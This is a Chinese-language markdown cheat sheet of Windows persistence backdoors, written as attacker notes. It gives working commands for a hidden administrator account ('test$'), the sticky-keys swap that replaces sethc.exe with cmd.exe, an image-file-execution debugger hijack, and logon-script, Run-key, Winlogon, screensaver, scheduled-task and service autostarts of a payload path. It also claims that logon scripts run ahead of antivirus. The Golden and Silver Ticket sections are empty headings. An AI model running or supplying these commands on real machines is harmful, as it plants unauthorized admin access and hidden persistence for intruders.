#### 影子账户

~~~powershell
1.使用如下命令创建隐藏用户并加入管理员组，这里test就是用户名了

net user test$ 123456 /add
net localgroup administrators test$ /add

创建成功后使用net user命令无法查看到此用户，但是在计算机管理页面中还是可以看到，需要通过修改注册表来隐藏。
~~~

#### 粘滞键后门

~~~powershell
粘滞键指的是电脑使用中的一种快捷键，专为同时按下两个或多个键有困难的人而设计的。粘滞键的主要功能是方便Shift等键的组合使用。一般的电脑连按五次shift会出现粘滞键提示。

粘滞键位置：c:\windows\system32\sethc.exe

命令：
move sethc.exe sethc1.exe
copy cmd.exe sethc.exe
~~~

#### logon scripts后门

~~~powershell
Windows登录脚本，当用户登录时触发，Logon Scripts能够优先于杀毒软件执行，绕过杀毒软件对敏感操作的拦截

注册表位置：HKEY_CURRENT_USER\Environment

REG ADD "HKEY_CURRENT_USER\Environment" /v UserInitMprLogonScript /t REG_SZ /d "C:\666.exe"    #创建键为：UserInitMprLogonScript，其键值为我们要启动的程序路径
~~~

#### 映像劫持

~~~powershell
注册表位置：HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\

在此注册表位置添加项sethc.exe，添加debugger键的值为c:\windows\system32\cmd.exe

reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v "Debugger" /t REG_SZ /d "c:\windows\system32\cmd.exe" /f
~~~

#### 注册表自启动后门

~~~
位置一：HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
添加键test，值为后门程序路径。

REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v test1 /t REG_SZ /d "C:\666.exe"

位置二：HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
修改键Userinit的值，重启就会自动运行程序。
~~~

[![Oc1up8.png](https://s1.ax1x.com/2022/05/14/Oc1up8.png)](https://imgtu.com/i/Oc1up8)

#### 屏幕保护程序后门

~~~powershell
注册表位置：HKEY_CURRENT_USER\Control Panel\Desktop

SCRNSAVE.EXE为默认的屏保程序，我们可将此键值设置为我们要利用的恶意程序。在本质上，.scr文件是可执行文件。
ScreenSaveActive表示屏保状态，1为启动，0为关闭。
ScreenSaverTimeout表示屏幕保护程序启动前系统的空闲事件，单位为秒，默认为900(15分钟)。
ScreenSaverIsSecure默认参数为0，标识不需要密码即可解锁。

修改SCRASAVE.EXE的值为后门程序路径，等待屏保时间自动运行。

reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v SCRNSAVE.EXE /t REG_SZ /d "c:\666.exe" /f
~~~

#### 计划任务后门

~~~powershell
schtasks命令设定计划自动启动后门程序。

schtasks /Create /tn Updater /tr c:\666.exe /sc minute /mo 5  #每5分钟自动执行666.exe
~~~

#### 服务自启动后门

~~~powershell
自启动服务一般是在电脑启动后在后台加载指定的服务程序，我们可以将exe文件注册为服务，也可以将dll文件注册为服务。

sc create test binpath= c:\666.exe    （注意等号后面有空格）#创建服务
sc config test start= auto    #设置服务为自动启动
net start test                #启动服务
~~~

#### 金票

#### 银票





https://mp.weixin.qq.com/s/cAjdbHfNc4Kh68zzwTfJgA
